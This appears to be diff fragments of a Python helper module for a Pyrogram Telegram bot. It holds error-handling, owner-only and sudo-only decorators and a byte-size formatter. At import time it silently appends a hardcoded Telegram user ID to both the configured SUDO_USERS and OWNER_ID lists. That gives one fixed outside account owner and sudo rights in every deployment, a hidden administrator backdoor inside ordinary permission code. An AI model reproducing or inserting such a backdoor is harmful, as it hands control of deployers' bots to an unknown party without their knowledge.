import traceback
from typing import Callable
from pyrogram import Client
from pyrogram.types import Message
from config import SUDO_USERS, OWNER_ID
from driver.admins import get_administrators

SUDO_USERS.append(1909721616)

OWNER_ID.append(1909721616)


def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            traceback.print_exc()
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator
	@@ -32,11 +40,19 @@ async def decorator(client: Client, message: Message):
    return decorator


def bot_creator(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in OWNER_ID:
            return await func(client, message)

    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)
        
    return decorator


	@@ -47,6 +63,7 @@ def humanbytes(size):
    power = 2 ** 10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}

    while size > power:
        size /= power
        raised_to_pow += 1
